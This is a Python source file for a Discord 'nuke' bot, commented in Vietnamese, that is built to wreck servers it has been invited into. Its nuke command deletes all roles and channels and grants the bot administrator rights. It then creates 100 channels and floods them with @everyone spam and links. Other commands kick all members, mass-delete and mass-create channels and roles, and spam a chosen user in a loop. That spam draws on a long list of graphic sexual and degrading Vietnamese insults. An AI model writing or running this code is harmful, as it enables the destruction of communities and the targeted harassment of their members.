import asyncio
import os
import random
import discord
from discord.ext import commands
import aiohttp

# ==================== CẤU HÌNH HỆ THỐNG ====================
DISCORD_TOKEN = os.getenv("TOKEN")

# Danh sách ID của Boss Bảo và các đồng minh ủy quyền
BOT_OWNERS = [
    1535132569534865490,
]

# Kênh log cố định
LOG_CHANNEL_ID = 1537813100546236497

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.moderation = True

bot = commands.Bot(command_prefix="l!", intents=intents, help_command=None)

# Biến trạng thái cho spam
is_spamming = False
spam_task_running = None

# Lưu kênh log cho từng server
SERVER_LOG_CHANNELS = {}

# --- LƯU TRỮ DỮ LIỆU LEVEL & CẤU HÌNH CHÀO MỪNG / TẠM BIỆT ---
# Định dạng: { guild_id: { user_id: {"exp": int, "level": int} } }
USER_LEVELS = {}

# Định dạng: { guild_id: channel_id }
WELCOME_CHANNELS = {}
GOODBYE_CHANNELS = {}

CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/7a/41/bb/7a41bb51fe3babe0c6cee161f85df62c.gif"
NUKE_GIF_URL = "https://i.pinimg.com/originals/a3/30/8c/a3308c2100e2526873b3ae8b3ab47b57.gif"
NUKE_AVATAR_URL = "https://i.pinimg.com/736x/06/77/96/0677966604d6b8f84a47fa667260ec4d.jpg"
LEVEL_UP_GIF = "https://i.pinimg.com/originals/c3/2c/e0/c32ce0a583261b5a296afc194671a5f9.gif"

# ==================== KHO SPAM (209 CÂU) ====================
ROAST_LINES = [
    "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
    "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
    "# Thằng óc lồn rộng, mặt giống lỗ đít thối + đầy phân + tinh trùng! {username}",
    "# Mày là đồ bệnh hoạn, chuyên bú cặc chó + ngựa + tự địt lỗ đít! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối rữa! {username}",
    "# Thằng óc phân thối rữa, lồn mẹ mày bị địt đến chảy máu + mủ đặc sưng vù như quả bóng vỡ! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đụ má cái lồn to đùng, chứa đống tinh trùng thối rữa + máu mủ nước! {username}",
    "# Địt mẹ thằng chó đẻ, cặc mày hôi như đống cứt tươi + phân ngựa giữa trời nắng gắt! {username}",
    "# Con đĩ bán dâm, lồn rộng vì bị địt trăm lần + thú + nhét đồ! {username}",
    "# Con đĩ bán thân, lồn rộng vì địt nhiều + thú vật + vật lạ vào! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Con đĩ bán dâm chuyên, lồn rộng vì địt nhiều thú + nhét vật lạ! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú cặc thú + tự địt lỗ đít mình! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân chó tươi! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn của xã hội chuyên bú cặc thú vật! {username}",
    "# Mày chết mẹ mày, đồ rác của xã hội bệnh hoạn chuyên bú cặc thú! {username}",
    "# Lồn to như cái chảo lớn, chứa tinh trùng thối rữa + máu mủ + nước đái thú! {username}",
    "# Đụ má thằng mặt khỉ đột, mẹ mày bú cặc ngựa cả ngày + nuốt tinh trùng sống! {username}",
    "# Chửi tục cái lồn nát, cút xéo thằng chó đẻ bú cặc thú cho đã! {username}",
    "# Đụ má cái lồn to đùng chứa tinh trùng thối + máu mủ + nước đái chó! {username}",
    "# Đéo thèm quan tâm, cái mặt lồn thối của mày đầy nước dãi + phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi chết trong phân thối! {username}",
    "# Lồn mẹ mày rộng như hố phân công cộng ngoài đồng, bị địt đến sưng vù nát như tương đặc + chảy nước nhớt thối! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết 10 ngày + phân! {username}",
    "# Cặc mày teo tóp như con giòi thối rữa trong đống cứt, địt vào lồn già nua thối như xác chết 10 ngày giữa nắng! {username}",
    "# Cặc teo tóp như giòi thối, địt mẹ cái đồ mất dạy óc phân bò! {username}",
    "# Cặc teo như hạt tiêu thối trong phân, địt mẹ cái đồ mất dạy hết mức óc phân! {username}",
    "# Lồn rộng như hồ phân, đụ má thằng khốn kiếp óc cứt thối này! {username}",
    "# Địt mẹ thằng mặt lồn rộng thênh thang như sân vận động chứa phân, óc toàn phân bò khô + nước đái! {username}",
    "# Cặc teo như con giòi thối, địt mẹ cái thằng ngu óc phân bò! {username}",
    "# Đụ má thằng mặt thú vật, mẹ mày bú cặc chó đồng + nuốt tinh trùng! {username}",
    "# Mày chết mẹ mày đi cho sạch đường, lồn to đùng chứa cả xô tinh trùng thối rữa + máu mủ + nước tiểu chó! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Chửi đổng cái lồn thối, cút xéo thằng chó đẻ bú cặc thú vật đi! {username}",
    "# Thằng óc phân thối, mặt giống lỗ đít thối tha đầy phân + tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đéo thèm quan tâm cái lồn thối của mày, bú cặc lợn + chó + tự nhét vào lỗ đít đi! {username}",
    "# Lồn rộng như hồ nước phân ngoài đồng, đụ má thằng khốn nạn óc cứt thối này! {username}",
    "# Mày là đồ mất dạy hết, chuyên bú cặc thú rừng + nuốt sống tinh trùng! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn hình dạng + chảy máu mủ nước nhớt! {username}",
    "# Lồn rộng như sân vận động phân, đụ má thằng óc cứt thối rữa! {username}",
    "# Lồn to như cái ao phân, chứa tinh trùng thối rữa cả xô + máu mủ! {username}",
    "# Đéo thèm nhìn cái mặt lồn thối đầy nước dãi tinh trùng của mày, bú cặc lợn + chó + ngựa đi! {username}",
    "# Đụ má thằng mặt lồn rộng, mẹ mày bú cặc thú + nuốt tinh trùng sống! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt! {username}",
    "# Con điếm rẻ tiền, chuyên bú cặc chó đêm ngày + nuốt sống tinh trùng! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Thằng óc lồn, mặt mày giống cái lỗ đít thối đầy phân + nước dãi tinh trùng! {username}",
    "# Cặc teo như hạt tiêu đen trong phân, địt mẹ cái đồ ngu si bệnh! {username}",
    "# Đụ má cái đồ rác, lồn to đùng chứa phân + tinh trùng thối rữa + máu mủ! {username}",
    "# Đụ má thằng mặt khỉ, mẹ mày bú cặc thú rừng cả đêm rồi nuốt sống! {username}",
    "# Thằng mặt thú dữ, mẹ mày con đĩ thú vật bú cặc + nuốt tinh trùng! {username}",
    "# Cặc teo tóp xíu xiu như con giòi chết trong cứt, địt mẹ cái thằng ngu si óc phân bò! {username}",
    "# Con đĩ mẹ mày chuyên quỳ gối bú cặc thú vật ngoài đồng rồi nuốt tinh trùng chó tươi + phân lẫn vào! {username}",
    "# Đụ con mẹ chúng mày hết, bú cặc thú vật đi cho rồi + nuốt tinh! {username}",
    "# Địt vào lồn già nua của mẹ mày đến sưng vù + chảy nước nhớt thối + máu mủ lẫn lộn! {username}",
    "# Lồn to như thúng, chứa tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Lồn rộng như cái ao phân ngoài đồng chứa đầy tinh trùng thối, đụ má thằng khốn nạn óc cứt này! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn gì + chảy nước nhớt + máu mủ đặc! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Cặc teo như tiêu đen thối, địt mẹ cái thằng ngu si bệnh hoạn! {username}",
    "# Đéo có tư cách gì, lồn mẹ mày thối như phân bò tươi + xác chết! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình + mủ máu chảy lênh láng! {username}",
    "# Cặc hôi thối như phân, địt vào lồn già nua thối đến sưng chảy! {username}",
    "# Con điếm chuyên bú, cặc thú vật suốt ngày + nuốt sống tinh trùng phân! {username}",
    "# Đéo biết xấu hổ gì, lồn mẹ mày thối như cứt xác chết đầy dòi! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối rữa trong cứt! {username}",
    "# Đụ con mẹ mày nữa, bú cặc thú vật + tinh trùng sống + phân chó! {username}",
    "# Đéo có tư cách, lồn mẹ mày thối như xác chết 15 ngày + đầy dòi! {username}",
    "# Con đĩ thối tha, lồn rộng vì bị địt quá nhiều + thú vật + vật lạ! {username}",
    "# Lồn to như cái thúng chứa đầy tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Mày chết cho sạch, đồ bệnh hoạn chuyên bú thú + tự địt lỗ đít! {username}",
    "# Cặc hôi thối như cứt chó tươi giữa nắng, địt vào lồn già nua đến sưng! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân + nước đái! {username}",
    "# Lồn rộng như hồ nước phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Đụ con mẹ mày lần nữa, bú cặc thú + nuốt tinh trùng sống + phân! {username}",
    "# Óc cứt thối hoắc, lồn mẹ mày sưng vù vì địt + nhét vật lạ + thú! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Đéo thèm quan tâm đến cái lồn thối + đầy nước dãi tinh trùng + phân của mày! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình dạng + chảy máu mủ! {username}",
    "# Chửi đổng cái lồn nát, cút mẹ mày bú cặc chó đi cho thỏa mãn! {username}",
    "# Thằng mặt lờ đờ, mẹ mày con đĩ chó bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Đéo thèm nhìn mặt, cái lồn thối hoắc đầy nước dãi + phân của mày! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú thú vật + tự địt! {username}",
    "# Đụ con đĩ già nua thối như xác chết phân hủy, cặc mày hôi như đống cứt chó + phân ngựa phơi nắng! {username}",
    "# Mày là đồ mất dạy hết mức, chuyên bú cặc thú rừng + nuốt sống tinh trùng + phân! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối trong phân! {username}",
    "# Địt mẹ thằng chó cái đẻ, cặc teo tóp xíu như giòi trong phân! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú vật chuyên bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Mày là đồ vô học, chuyên bú cặc ngựa + chó + lợn + nuốt sống! {username}",
    "# Cặc nhỏ như đậu thối, địt vào lồn già đến sưng vù + chảy máu mủ! {username}",
    "# Cặc nhỏ xíu như kiến, địt vào lồn già chảy máu mủ + nước nhớt! {username}",
    "# Đụ con đĩ già nua, cặc mày hôi như phân bò phơi nắng + xác chết thối! {username}",
    "# Cặc nhỏ như kiến chết, địt vào lồn già đến sưng + chảy máu mủ nhớt! {username}",
    "# Thằng mặt lờ, mẹ mày là con đĩ thú vật bú cặc ngựa + chó ngoài đường! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + nước dãi tinh trùng thú! {username}",
    "# Địt vào mồm thối hoắc, nuốt tinh trùng chó + phân tươi + nước đái! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú bú cặc + nuốt tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc hôi như phân bò phơi + xác chết thối! {username}",
    "# Óc phân bò khô thối, lồn mẹ mày sưng vù vì bị địt + nhét cặc thú + vật lạ! {username}",
    "# Địt mẹ thằng chó cái, cặc teo tóp xíu như giòi chết trong phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi thối rữa trong đống cứt! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn gì + chảy nước máu mủ lênh láng! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến nát + chảy mủ máu nước nhớt! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn chuyên bú cặc thú của xã hội! {username}",
    "# Đụ má cái đồ mất dạy hết mức, mẹ mày bú cặc thú rừng rồi nuốt tinh trùng sống + phân chó! {username}",
    "# Đụ má thằng mặt thú, mẹ mày bú cặc ngựa + chó ngoài đồng rồi nuốt sống! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + tinh trùng thú! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt thối! {username}",
    "# Địt vào mồm mày, bắt nuốt tinh trùng thối + phân chó tươi + nước đái lẫn! {username}",
    "# Đụ con mẹ mày lần nữa nữa, bú cặc thú vật + nuốt tinh trùng sống! {username}",
    "# Óc cứt thối của mày, đụ con đĩ mẹ mày lần nữa rồi bắt nó quỳ bú cặc chó ngoài đường! {username}",
    "# Cặc hôi thối như cứt tươi, địt vào lồn già thối hoắc đến sưng vù! {username}",
    "# Mày chết mẹ mày đi ngay, đồ rác rưởi hết mức chuyên bú cặc thú! {username}",
    "# Chửi đổng cái lồn, cút xéo đi thằng chó đẻ bú cặc thú vật! {username}",
    "# Cặc hôi thối như cứt chó tươi, địt vào lồn già đến sưng chảy mủ! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến không còn gì + chảy nước máu! {username}",
    "# Cặc nhỏ xíu như đậu thối, địt vào lồn già chảy máu + mủ nhớt! {username}",
    "# Địt vào mồm thối hoắc của mày rồi bắt nuốt tinh trùng chó tươi + phân + nước đái! {username}",
    "# Con đĩ thối tha hết, lồn rộng vì bị địt cả trăm lần + thú vật! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết thối + phân bò! {username}",
    "# Con đĩ thối tha hết mức, lồn rộng thênh thang như biển phân + tinh trùng thối rữa! {username}",
    "# Đụ má cái lồn thối hoắc nát bét chảy mủ máu của mẹ mày, quỳ xuống bú cặc chó + ngựa + lợn + nuốt tinh trùng sống cả đống! {username}",
    "# Đéo biết xấu hổ chút nào, lồn mẹ mày thối như xác chết phân hủy đầy dòi bọ! {username}",
    "# Thằng mặt thú vật hoang dã, lồn mẹ mày thối hoắc như xác chết phân hủy giữa mùa hè oi bức! {username}"
]

# ==================== HỆ THỐNG NUKE ====================
NUKE_CHANNEL_NAMES = [
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝕎𝔸ℝ 𝔸ℝ𝕋",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
    "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
    "☠️𝔹𝕆𝕋 ℕ𝕌𝕂𝔼𝔻 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆",
    "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀"
]

def is_bot_owner():
    async def predicate(ctx):
        return ctx.author.id in BOT_OWNERS
    return commands.check(predicate)

# ==================== VIEW XÁC NHẬN NUKE QUA DM ====================
class NukeConfirmView(discord.ui.View):
    def __init__(self, guild: discord.Guild, channel: discord.abc.Messageable):
        super().__init__(timeout=60)
        self.guild = guild
        self.channel = channel

    @discord.ui.button(label="🟢 ĐỒNG Ý NUKE SERVER", style=discord.ButtonStyle.green)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Đã xác nhận! Đang tiến hành...", ephemeral=True)
        await self.channel.send("⚠️ Từ từ đang check sever đã...")
        
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        self.stop()

        await execute_nuke(self.guild)

    @discord.ui.button(label="🔴 TỪ CHối", style=discord.ButtonStyle.red)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        await interaction.response.send_message(f"Bạn đã từ chối nuke sever {self.guild.name}", ephemeral=True)
        self.stop()

async def execute_nuke(guild):
    try:
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            await log_channel.send(embed=discord.Embed(title="🔥 SIÊU NUKE BẮT ĐẦU...", color=0xFF0000))

        supreme_role = None
        async def prep_nuke():
            nonlocal supreme_role
            tasks = []
            
            tasks.append(guild.edit(name="DEAD SEVER"))
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(NUKE_AVATAR_URL) as resp:
                        if resp.status == 200:
                            image_data = await resp.read()
                            tasks.append(guild.edit(icon=image_data))
            except:
                pass

            for role in guild.roles:
                if role.name != "@everyone":
                    tasks.append(role.delete())

            await asyncio.gather(*tasks, return_exceptions=True)

            try:
                supreme_role = await guild.create_role(
                    name="👑 ℕ𝕌𝕂𝔼ℝ 𝕆ℕ 𝕋𝕆ℙ 👑",
                    permissions=discord.Permissions(administrator=True),
                    color=discord.Color.red(),
                    hoist=True
                )
                await guild.me.add_roles(supreme_role)
            except Exception as e:
                print(f"Lỗi tạo/add role tối cao: {e}")

            kick_tasks = []
            for member in guild.members:
                if member.bot and member.id != bot.user.id:
                    kick_tasks.append(member.kick(reason="Anti-bot / Nuke cleanup"))
            
            if kick_tasks:
                await asyncio.gather(*kick_tasks, return_exceptions=True)

        await prep_nuke()

        delete_tasks = [channel.delete() for channel in guild.channels]
        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)

        create_tasks = []
        for i in range(100):
            channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
            create_tasks.append(guild.create_text_channel(name=channel_name))
        
        created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)

        spam_content = (
            "# DETROYED BY BOSS BẢO ĐZ AND WAR ART (●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"|| link support 1 ||: https://xnhau.pics/"\n'
            ' "|| link support 2 ||: https://discord.gg/hSdEUZD6Jp"'
        )
        
        valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
        
        for i in range(20):
            batch_tasks = []
            for channel in valid_channels:
                async def send_msg(ch=channel):
                    try:
                        embed = discord.Embed()
                        embed.set_image(url=NUKE_GIF_URL)
                        await ch.send(spam_content, embed=embed)
                    except:
                        pass
                batch_tasks.append(send_msg())
            
            await asyncio.gather(*batch_tasks, return_exceptions=True)
            await asyncio.sleep(0.3)

        if log_channel:
            await log_channel.send(embed=discord.Embed(title="✅ Nuke siêu tốc hoàn tất bởi Boss Bảo!", color=0x00FF00))

    except Exception as e:
        print(f"Lỗi khi thực hiện nuke: {e}")

# ==================== LỆNH NUKE SERVER GỬI THƯ DM ====================
@bot.command(name="nuke")
@is_bot_owner()
async def nuke_server(ctx):
    try:
        try:
            await ctx.message.delete()
        except:
            pass

        confirm_embed = discord.Embed(
            title="🔴 🌈 **XÁC NHẬN LỆNH NUKE TỪ BOSS BẢO** 🌈 🔴",
            description=(
                f"🔥 **Kính chào Boss Bảo!**\nBạn đã yêu cầu nuke máy chủ: **{ctx.guild.name}** (`{ctx.guild.id}`)\n\n"
                f"Vui lòng kiểm tra kỹ và bấm nút bên dưới để quyết định:\n"
                f"• 🟢 **Đồng ý:** Bot sẽ xả tin nhắn.\n"
                f"• 🔴 **Từ chối:** Hủy bỏ lệnh."
            ),
            color=0xFF0000
        )
        confirm_embed.set_footer(text="Hệ thống tối cao phục vụ Boss Bảo 💖")

        view = NukeConfirmView(ctx.guild, ctx.channel)
        await ctx.author.send(embed=confirm_embed, view=view)
        
        temp_notice = await ctx.send("📩 **Boss Bảo check tin nhắn riêng (DM) để xác nhận lệnh nuke nhé!**")
        await asyncio.sleep(5)
        try:
            await temp_notice.delete()
        except:
            pass

    except discord.Forbidden:
        await ctx.send("❌ Boss Bảo ơi, hãy mở DM (Tin nhắn riêng) để bot có thể gửi bảng xác nhận nuke nhé!")
    except Exception as e:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(e)}")

@nuke_server.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== CÁC LỆNH CÀI ĐẶT CHÀO MỪNG & TẠM BIỆT (YÊU CẦU MỚI) ====================
@bot.command(name="setwellcom")
@is_bot_owner()
async def set_wellcom(ctx, channel: discord.TextChannel = None):
    if channel is None:
        await ctx.send("📌 Vui lòng chỉ định kênh! Cú pháp: `l!setwellcom #kenh`")
        return
    WELCOME_CHANNELS[ctx.guild.id] = channel.id
    await ctx.send(f"✅ Đã thiết lập kênh **chào mừng** thành công tại {channel.mention}!")

@set_wellcom.error
async def set_wellcom_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="setgoodbye")
@is_bot_owner()
async def set_goodbye(ctx, channel: discord.TextChannel = None):
    if channel is None:
        await ctx.send("📌 Vui lòng chỉ định kênh! Cú pháp: `l!setgoodbye #kenh`")
        return
    GOODBYE_CHANNELS[ctx.guild.id] = channel.id
    await ctx.send(f"✅ Đã thiết lập kênh **tạm biệt** thành công tại {channel.mention}!")

@set_goodbye.error
async def set_goodbye_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

# ==================== CÁC LỆNH PHỤ TRỢ KHÁC ====================
@bot.command(name="spamchannels")
@is_bot_owner()
async def spam_channels(ctx, amount: int = 100):
    try:
        if amount > 200: amount = 200
        for i in range(amount):
            try:
                channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
                await ctx.guild.create_text_channel(name=channel_name)
                await asyncio.sleep(0.3)
            except:
                continue
        await ctx.send("✅ Tạo kênh hoàn tất!")
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_channels.error
async def spam_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="spameveryone")
@is_bot_owner()
async def spam_everyone(ctx):
    try:
        spam_content = "# DETROYED BY BOSS BẢO\n|| @everyone||\n|| @here ||"
        for channel in ctx.guild.text_channels:
            try:
                for _ in range(5):
                    await channel.send(spam_content)
            except:
                continue
        await ctx.send("✅ Spam @everyone hoàn tất!")
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_everyone.error
async def spam_everyone_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deleteallchannels")
@is_bot_owner()
async def delete_all_channels(ctx):
    try:
        for channel in ctx.guild.channels:
            try: await channel.delete()
            except: pass
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_all_channels.error
async def delete_all_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="spamroles")
@is_bot_owner()
async def spam_roles(ctx, amount: int = 50):
    try:
        for i in range(min(amount, 100)):
            try:
                await ctx.guild.create_role(name=NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)])
            except: pass
        await ctx.send("✅ Tạo role hoàn tất!")
    except Exception as e: await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_roles.error
async def spam_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deleteallroles")
@is_bot_owner()
async def delete_all_roles(ctx):
    try:
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try: await role.delete()
                except: pass
        await ctx.send("✅ Đã xóa hết role!")
    except Exception as e: await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_all_roles.error
async def delete_all_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="kickall")
@is_bot_owner()
async def kick_all_members(ctx):
    try:
        for member in ctx.guild.members:
            if not member.bot and member.id not in BOT_OWNERS and member.id != ctx.guild.owner_id:
                try: await member.kick()
                except: pass
        await ctx.send("✅ Đã kick thành viên!")
    except Exception as e: await ctx.send(f"❌ Lỗi: {str(e)}")

@kick_all_members.error
async def kick_all_members_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setservername")
@is_bot_owner()
async def set_server_name(ctx, *, new_name: str):
    try:
        await ctx.guild.edit(name=new_name)
        await ctx.send(f"✅ Đổi tên server thành công thành: {new_name}")
    except Exception as e: await ctx.send(f"❌ Lỗi: {str(e)}")

@set_server_name.error
async def set_server_name_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setservericon")
@is_bot_owner()
async def set_server_icon(ctx, url: str = None):
    try:
        image_data = None
        if url:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status == 200: image_data = await resp.read()
        await ctx.guild.edit(icon=image_data)
        await ctx.send("✅ Đổi icon thành công!")
    except Exception as e: await ctx.send(f"❌ Lỗi: {str(e)}")

@set_server_icon.error
async def set_server_icon_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="mute")
@is_bot_owner()
async def mute(ctx, member: discord.Member, *, reason="Không có lý do"):
    try:
        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        if not muted_role:
            muted_role = await ctx.guild.create_role(name="Muted", permissions=discord.Permissions(send_messages=False))
        await member.add_roles(muted_role, reason=reason)
        await ctx.send(f"🔇 Đã mute {member.mention}")
    except Exception as e: await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="unmute")
@is_bot_owner()
async def unmute(ctx, member: discord.Member):
    try:
        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        if muted_role and muted_role in member.roles:
            await member.remove_roles(muted_role)
            await ctx.send(f"🔊 Đã unmute {member.mention}")
    except Exception as e: await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="warn")
@is_bot_owner()
async def warn(ctx, member: discord.Member, *, reason="Cảnh cáo"):
    try:
        await member.send(f"⚠️ Bạn đã bị cảnh cáo ở server {ctx.guild.name} vì: {reason}")
        await ctx.send(f"✅ Đã cảnh cáo {member.mention}")
    except: await ctx.send("❌ Không gửi được tin nhắn cho thành viên này.")

@bot.command(name="clear")
@is_bot_owner()
async def clear(ctx, amount: int = 10):
    try:
        await ctx.channel.purge(limit=amount + 1)
    except Exception as e: await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="addowner")
@is_bot_owner()
async def addowner(ctx, target: discord.User):
    if target.id not in BOT_OWNERS: BOT_OWNERS.append(target.id)
    await ctx.send(f"✅ Đã thêm {target} làm owner.")

@addowner.error
async def addowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deleteowner")
@is_bot_owner()
async def deleteowner(ctx, target: discord.User):
    if target.id in BOT_OWNERS and len(BOT_OWNERS) > 1:
        BOT_OWNERS.remove(target.id)
        await ctx.send(f"🗑️ Đã xóa {target}")
    else: await ctx.send("❌ Không thể xóa!")

@deleteowner.error
async def deleteowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="spam")
@is_bot_owner()
async def spam(ctx, member: discord.Member = None, *, custom_text: str = None):
    global spam_task_running, is_spamming
    if not member: return await ctx.send("📌 Thiếu thành viên!")
    if spam_task_running: spam_task_running.cancel()
    is_spamming = True
    async def loop():
        while True:
            msg = f"{member.mention} {custom_text}" if custom_text else random.choice(ROAST_LINES).format(username=member.mention)
            await ctx.send(msg)
            await asyncio.sleep(0.6)
    spam_task_running = bot.loop.create_task(loop())
